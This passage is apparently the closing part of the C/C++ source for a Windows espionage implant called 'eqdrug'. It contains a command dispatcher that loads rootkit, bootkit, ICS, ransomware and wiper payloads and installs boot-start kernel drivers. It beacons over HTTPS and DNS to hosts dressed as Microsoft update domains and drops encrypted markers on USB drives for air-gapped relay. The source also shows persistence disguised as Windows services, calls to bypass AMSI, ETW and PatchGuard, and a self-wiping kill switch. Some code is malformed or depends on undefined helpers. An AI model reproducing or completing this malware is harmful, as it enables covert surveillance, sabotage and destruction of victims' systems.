case 0x00000008:{ULONG i2=BSWAP32(*(ULONG*)(dec+4));LK();PLIST_ENTRY le=g_e.x.Flink;while(le!=&g_e.x){PPLUGIN_ENTRY p1=CONTAINING_RECORD(le,PLUGIN_ENTRY,l);if(p1->i==i2){ULK();((NTSTATUS(*)(PEQDRUG_GLOBAL,PVOID,ULONG))p1->e)(&g_e,dec+8,BSWAP32(*(ULONG*)(dec+12)));break;}le=le->Flink;}ULK();break;}
case 0x00000009:{ULONG i2=BSWAP32(*(ULONG*)(dec+4));LK();PLIST_ENTRY le=g_e.y.Flink;while(le!=&g_e.y){PPAYLOAD_ENTRY p1=CONTAINING_RECORD(le,PAYLOAD_ENTRY,l);if(p1->i==i2){ULK();if(p1->t==PAYLOAD_ICS||p1->t==PAYLOAD_STUX||p1->t==PAYLOAD_DROPPER)IL((UCHAR*)p1->d,p1->s);else if(p1->t==PAYLOAD_ROOTKIT||p1->t==PAYLOAD_BOOTKIT){if(g_e.kernel_rw){WCHAR tp[MAX_PATH];GetTempPathW(MAX_PATH,tp);wcscat_s(tp,MAX_PATH,XWSTR(L"~k.sys"));HANDLE f=CreateFileW(tp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);if(f!=INVALID_HANDLE_VALUE){DWORD w=0;WriteFile(f,p1->d,p1->s,&w,NULL);CloseHandle(f);SC_HANDLE s=OpenSCManagerW(NULL,NULL,SC_MANAGER_CREATE_SERVICE);if(s){SC_HANDLE sv=CreateServiceW(s,XWSTR(L"EQK"),XWSTR(L"EQK"),SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_BOOT_START,SERVICE_ERROR_CRITICAL,tp,NULL,NULL,NULL,NULL,NULL);if(sv){SERVICE_STATUS st;StartServiceW(sv,0,NULL);CloseServiceHandle(sv);}CloseServiceHandle(s);}DeleteFileW(tp);}}else IRDI(GetCurrentProcess(),(UCHAR*)p1->d,p1->s);break;}}le=le->Flink;}ULK();break;}
case 0x0000000A:{ULONG i2=BSWAP32(*(ULONG*)(dec+4));HDD_HIDE_AREA(i2);break;}
case 0x0000000B:g_e.selfdestruct=TRUE;break;
default:break;}}}F(rd);InternetCloseHandle(r);InternetCloseHandle(c1);InternetCloseHandle(i);}
if(c->f&C2_DNS){WSADATA w;WSAStartup(MAKEWORD(2,2),&w);ADDRINFOW h={0},*r1=NULL;h.ai_family=AF_INET;h.ai_socktype=SOCK_DGRAM;h.ai_protocol=IPPROTO_UDP;
WCHAR dn[512];swprintf_s(dn,512,XWSTR(L"%08X%08X%08X%08X.%s"),BSWAP32(g_e.m),BSWAP32(g_e.z),BSWAP32(g_e.w),BSWAP32(g_e.cycle),c->d);
GetAddrInfoW(dn,XWSTR(L"53"),&h,&r1);if(r1){SOCKET s=socket(r1->ai_family,r1->ai_socktype,r1->ai_protocol);sendto(s,(CHAR*)&g_e.m,64,0,r1->ai_addr,r1->ai_addrlen);closesocket(s);FreeAddrInfoW(r1);}WSACleanup();}
if(c->f&C2_USB){WCHAR dl[26]={0};ULONG bs=GetLogicalDrives();
for(ULONG i=2;i<26;i++){if(bs&(1<<i)){WCHAR dr[8]={0};dr[0]=L'A'+i;dr[1]=L':';dr[2]=L'\\';UCHAR t=GetDriveTypeW(dr);
if(t==DRIVE_REMOVABLE){WCHAR p[MAX_PATH];swprintf_s(p,MAX_PATH,XWSTR(L"%s%s"),dr,USB_SIG);
UCHAR ob[4096];ULONG ol=0;*(ULONG*)ob=BSWAP32(EQ_MAGIC);*(ULONG*)(ob+4)=BSWAP32(g_e.v);*(ULONG*)(ob+8)=BSWAP32(g_e.z);*(ULONG*)(ob+12)=BSWAP32(g_e.w);
UCHAR iv[12],ct[16];RNG(iv,12);UCHAR e1[4096];EQ_ENC_CBC(&g_c,ob,16,e1,&ol,iv);
HANDLE f=CreateFileW(p,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
if(f!=INVALID_HANDLE_VALUE){DWORD w=0;WriteFile(f,iv,12,&w,NULL);WriteFile(f,e1,ol,&w,NULL);WriteFile(f,ct,16,&w,NULL);CloseHandle(f);g_e.usb_count++;g_e.airgap_state=1;}}}}
return STATUS_SUCCESS;}
static DWORD WINAPI CT(LPVOID p){PEQDRUG_GLOBAL e=(PEQDRUG_GLOBAL)p;ULONG rc=0;
while(e->GlobalAttackEnable){if(!HC(&e->g))rc=0;else{rc++;if(rc>=MAX_RETRY){SM(5);rc=0;}}
ULONG sl=e->g.t/1000;if(sl<60)sl=60;SM(sl/60);if(e->selfdestruct)break;}return 0;}

static NTSTATUS LP(PPLUGIN_ENTRY p){if(!p||!p->p)return STATUS_UNSUCCESSFUL;
PIMAGE_DOS_HEADER d=(PIMAGE_DOS_HEADER)p->p;PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((ULONG_PTR)p->p+d->e_lfanew);
ULONG o=n->OptionalHeader.AddressOfEntryPoint;if(!o)return STATUS_UNSUCCESSFUL;
p->e=(PVOID)((ULONG_PTR)p->p+o);UCHAR h[32];SHA256((UCHAR*)p->p,p->s,h);memcpy(p->h,h,32);
return ((NTSTATUS(*)(PEQDRUG_GLOBAL))p->e)(&g_e);}
static NTSTATUS EP(ULONG i,PVOID a,ULONG l){LK();PLIST_ENTRY e=g_e.x.Flink;
while(e!=&g_e.x){PPLUGIN_ENTRY p=CONTAINING_RECORD(e,PLUGIN_ENTRY,l);if(p->i==i){ULK();return ((NTSTATUS(*)(PEQDRUG_GLOBAL,PVOID,ULONG))p->e)(&g_e,a,l);}e=e->Flink;}ULK();return STATUS_UNSUCCESSFUL;}
static NTSTATUS LY(PPAYLOAD_ENTRY p){if(!p||!p->d)return STATUS_UNSUCCESSFUL;
UCHAR h[32];SHA256((UCHAR*)p->d,p->s,h);if(memcmp(h,p->h,32))return STATUS_UNSUCCESSFUL;
switch(p->t){case PAYLOAD_DROPPER:case PAYLOAD_SPY:case PAYLOAD_BOT:return IL((UCHAR*)p->d,p->s);
case PAYLOAD_ROOTKIT:case PAYLOAD_BOOTKIT:{WCHAR tp[MAX_PATH];GetTempPathW(MAX_PATH,tp);wcscat_s(tp,MAX_PATH,XWSTR(L"~pk.sys"));
HANDLE f=CreateFileW(tp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
if(f==INVALID_HANDLE_VALUE)return STATUS_UNSUCCESSFUL;DWORD w=0;WriteFile(f,p->d,p->s,&w,NULL);CloseHandle(f);
SC_HANDLE s=OpenSCManagerW(NULL,NULL,SC_MANAGER_CREATE_SERVICE);if(!s){DeleteFileW(tp);return STATUS_UNSUCCESSFUL;}
SC_HANDLE sv=CreateServiceW(s,XWSTR(L"EQPK"),XWSTR(L"EQPK"),SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_BOOT_START,SERVICE_ERROR_CRITICAL,tp,NULL,NULL,NULL,NULL,NULL);
if(sv){SERVICE_STATUS t;StartServiceW(sv,0,NULL);CloseServiceHandle(sv);}CloseServiceHandle(s);DeleteFileW(tp);return STATUS_SUCCESS;}
case PAYLOAD_ICS:case PAYLOAD_STUX:return IL((UCHAR*)p->d,p->s);
case PAYLOAD_RANSOM:case PAYLOAD_WIPER:return IRDI(GetCurrentProcess(),(UCHAR*)p->d,p->s);
default:return STATUS_UNSUCCESSFUL;}}
static NTSTATUS EY(ULONG i){LK();PLIST_ENTRY e=g_e.y.Flink;
while(e!=&g_e.y){PPAYLOAD_ENTRY p=CONTAINING_RECORD(e,PAYLOAD_ENTRY,l);if(p->i==i){ULK();return LY(p);}e=e->Flink;}ULK();return STATUS_UNSUCCESSFUL;}

static NTSELF_DESTRUCT(){g_e.GlobalAttackEnable=FALSE;
if(g_e.c){WaitForSingleObject(g_e.c,10000);CloseHandle(g_e.c);}
LK();PLIST_ENTRY e=g_e.x.Flink;while(e!=&g_e.x){PPLUGIN_ENTRY p=CONTAINING_RECORD(e,PLUGIN_ENTRY,l);e=e->Flink;if(p->p)F(p->p);F(p);}
e=g_e.y.Flink;while(e!=&g_e.y){PPAYLOAD_ENTRY p=CONTAINING_RECORD(e,PAYLOAD_ENTRY,l);e=e->Flink;if(p->d)F(p->d);F(p);}ULK();
HKEY k;if(!RegOpenKeyExW(HKEY_CURRENT_USER,XWSTR(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_SET_VALUE,&k)){RegDeleteValueW(k,XWSTR(L"Windows Font Cache Service"));RegCloseKey(k);}
if(!RegOpenKeyExW(HKEY_LOCAL_MACHINE,XWSTR(L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe"),0,KEY_SET_VALUE,&k)){RegDeleteValueW(k,XWSTR(L"Debugger"));RegCloseKey(k);}
SC_HANDLE s=OpenSCManagerW(NULL,NULL,SC_MANAGER_CONNECT);if(s){SC_HANDLE sv=OpenServiceW(s,XWSTR(L"FontCache3.0.0.0"),SERVICE_ALL_ACCESS);
if(sv){SERVICE_STATUS t;ControlService(sv,SERVICE_CONTROL_STOP,&t);DeleteService(sv);CloseServiceHandle(sv);}
sv=OpenServiceW(s,XWSTR(L"EQDK"),SERVICE_ALL_ACCESS);if(sv){SERVICE_STATUS t;ControlService(sv,SERVICE_CONTROL_STOP,&t);DeleteService(sv);CloseServiceHandle(sv);}
sv=OpenServiceW(s,XWSTR(L"EQK"),SERVICE_ALL_ACCESS);if(sv){SERVICE_STATUS t;ControlService(sv,SERVICE_CONTROL_STOP,&t);DeleteService(sv);CloseServiceHandle(sv);}CloseServiceHandle(s);}
ITaskService*ts=NULL;if(CoCreateInstance(CLSID_TaskScheduler,NULL,CLSCTX_INPROC_SERVER,IID_ITaskService,(VOID**)&ts)==S_OK){
ts->Connect(_variant_t(),_variant_t(),_variant_t(),_variant_t());ITaskFolder*f=NULL;ts->GetFolder(_bstr_t(XWSTR(L"\\Microsoft\\Windows\\WindowsUpdate")),&f);
if(!f)ts->GetFolder(_bstr_t(XWSTR(L"\\")),&f);if(f){f->DeleteTask(_bstr_t(XWSTR(L"Windows Update Health Service")),0);f->Release();}ts->Release();}
if(g_e.d!=INVALID_HANDLE_VALUE)CloseHandle(g_e.d);
DeleteCriticalSection(&g_e.k);DeleteCriticalSection(&g_e.a);DeleteCriticalSection(&g_e.vlock);
WCHAR p[MAX_PATH];GetModuleFileNameW(NULL,p,MAX_PATH);
HANDLE f=CreateFileW(p,GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
if(f!=INVALID_HANDLE_VALUE){UCHAR z[65536]={0};DWORD w=0;SetFilePointer(f,0,NULL,FILE_BEGIN);
for(ULONG i=0;i<16;i++)WriteFile(f,z,65536,&w,NULL);SetEndOfFile(f);CloseHandle(f);}
typedef BOOL(WINAPI*DE)(LPCWSTR);DE df=(DE)GetProcAddress(LoadLibraryA(XSTR("kernel32.dll")),XSTR("DeleteFileW"));
if(df){df(p);WCHAR cmd[1024];swprintf_s(cmd,1024,XWSTR(L"/c timeout /t 1 /nobreak >nul && del /f /q \"%s\""),p);
ShellExecuteW(NULL,NULL,XWSTR(L"cmd.exe"),cmd,NULL,SW_HIDE);}
Z(&g_e,sizeof(g_e));ExitProcess(0);return STATUS_SUCCESS;}

static NTSTATUS IC(){memset(&g_e,0,sizeof(g_e));
g_e.m=EQ_MAGIC;g_e.v=(EQ_VERSION_MAJOR<<16)|EQ_VERSION_MINOR;g_e.b=EQ_BUILD;g_e.s=sizeof(g_e);
g_e.start_ts=GT();g_e.cycle=0;g_e.usb_count=0;g_e.airgap_state=0;
g_e.GlobalAttackEnable=TRUE;g_e.p=GetCurrentProcess();g_e.d=INVALID_HANDLE_VALUE;
g_e.kernel_rw=FALSE;g_e.admin=IsUserAnAdmin()?TRUE:FALSE;g_e.hvci=FALSE;g_e.dse_off=FALSE;
g_e.patchguard_bypass=FALSE;g_e.selfdestruct=FALSE;g_e.validated=FALSE;g_e.hddc=0;
SYSTEMTIME st;GetLocalTime(&st);g_e.killdate=st.wYear*10000+st.wMonth*100+st.wDay+EQ_KILL_MONTHS*100;
LOAD_OFFSETS();
InitializeListHead(&g_e.x);InitializeListHead(&g_e.y);InitializeListHead(&g_e.vfs);
InitializeCriticalSection(&g_e.k);InitializeCriticalSection(&g_e.a);InitializeCriticalSection(&g_e.vlock);
UCHAR mk[32]={0x9A,0x7B,0x3C,0x1D,0x5E,0x8F,0xA0,0x2B,0x4D,0x6F,0x1E,0x3A,0x7C,0x9B,0x2D,0x5F,0x8A,0xC1,0xE3,0x05,0x27,0x49,0x6B,0x8D,0xAF,0xC3,0xE5,0x07,0x29,0x4B,0x6D,0x8F};
KDF(mk,32,g_e.g.k,32,(UCHAR*)&g_e.m,4);RNG(g_e.g.i,12);RNG(g_e.g.id,16);EQ_INIT(&g_c,g_e.g.k);
memcpy(g_e.session_key,g_e.g.k,32);memcpy(g_e.session_iv,g_e.g.i,12);
g_e.g.v=1;g_e.g.p=443;g_e.g.b=8192;g_e.g.t=3600000;
g_e.g.f=C2_HTTPS|C2_DOMAIN|C2_PROXY|C2_DNS|C2_USB;
wcscpy_s(g_e.g.h,256,XWSTR(L"windowsupdate-update.net"));
wcscpy_s(g_e.g.u,128,XWSTR(L"/v1/WindowsUpdate/Update/Health/Check/x64/10.0.26100.2605"));
wcscpy_s(g_e.g.d,64,XWSTR(L"ms-dns-resolve.net"));
g_e.z=0;g_e.w=0;g_e.q=0;g_e.n=0;g_e.c1=0;g_e.d1=0;g_e.e1=0;g_e.f1=0;g_e.g1=0;g_e.h1=0;
return STATUS_SUCCESS;}
static NTSTATUS EI(){if(AA()){SELF_DESTRUCT();return STATUS_UNSUCCESSFUL;}
LAT();if(g_e.admin){AD();HVCI();BDSE();DISABLE_PG();TOKEN_STEAL();BYPASS_AMSI();BYPASS_ETW();BYPASS_CI();}
PR();HDD_ENUM();
g_e.c=CreateThread(NULL,0,CT,&g_e,0,NULL);
EP(PLUGIN_INFO,NULL,0);EP(PLUGIN_ICS,NULL,0);EP(PLUGIN_HDD,NULL,0);
g_e.validated=TRUE;return STATUS_SUCCESS;}

int WINAPI WinMain(HINSTANCE i,HINSTANCE p,LPSTR c,int s){
CoInitializeEx(NULL,COINIT_MULTITHREADED);
IC();if(EI()){while(g_e.GlobalAttackEnable){SS(1);
if(!(g_e.c1++%600))EP(PLUGIN_AV,NULL,0);
if(!(g_e.c1%3000))EP(PLUGIN_PROC,NULL,0);
if(!(g_e.c1%6000))EP(PLUGIN_NET,NULL,0);
if(!(g_e.c1%18000))EP(PLUGIN_DISK,NULL,0);
if(!(g_e.c1%36000))EP(PLUGIN_REG,NULL,0);
if(!(g_e.c1%86400)){g_e.cycle++;HDD_ENUM();}
SYSTEMTIME st;GetLocalTime(&st);ULONG td=st.wYear*10000+st.wMonth*100+st.wDay;
if(td>=g_e.killdate||g_e.selfdestruct)break;
if(g_e.usb_count>100)g_e.airgap_state=2;}}
SELF_DESTRUCT();CoUninitialize();return 0;}
int main(){return WinMain(GetModuleHandleW(NULL),NULL,NULL,SW_HIDE);}

// Usages: cl /O2 /Oi /GL /GS- /sdl- /MT /EHsc- /GR- /DYNAMICBASE:NO /NXCOMPAT eqdrug.cpp ntdll.lib advapi32.lib user32.lib shell32.lib bcrypt.lib setupapi.lib cfgmgr32.lib ws2_32.lib ole32.lib oleaut32.lib winhttp.lib wbemuuid.lib taskschd.lib version.lib